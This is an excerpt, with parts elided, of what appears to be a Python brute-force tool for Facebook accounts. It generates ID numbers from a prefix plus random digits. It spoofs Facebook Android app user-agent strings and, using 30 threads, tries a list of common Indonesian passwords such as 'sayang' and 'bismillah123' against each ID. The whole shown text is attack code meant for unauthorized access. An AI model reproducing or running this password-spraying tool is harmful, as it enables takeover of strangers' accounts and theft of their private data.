...
for xd in range(10000):
        ...
        c=f'itel P681L'
        g='Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]'
...
def indo():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'sayang','anjing','indonesia','jancok','bismillah','bismillah123','Sayang','sayangku','12345678','indonesiaku']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                android_version=random.choice(['6','7','8','9','10','11','12','13'])
                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}; Mi 10 Pro Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
